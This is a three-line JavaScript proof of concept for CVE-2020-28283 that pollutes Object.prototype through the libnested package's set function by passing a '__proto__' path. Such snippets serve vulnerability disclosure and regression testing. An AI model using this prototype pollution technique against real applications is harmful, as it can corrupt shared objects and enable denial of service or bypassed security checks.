//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28283
  const libnested = require("libnested");
  libnested.set({}, ["__proto__", "polluted"], "yes");
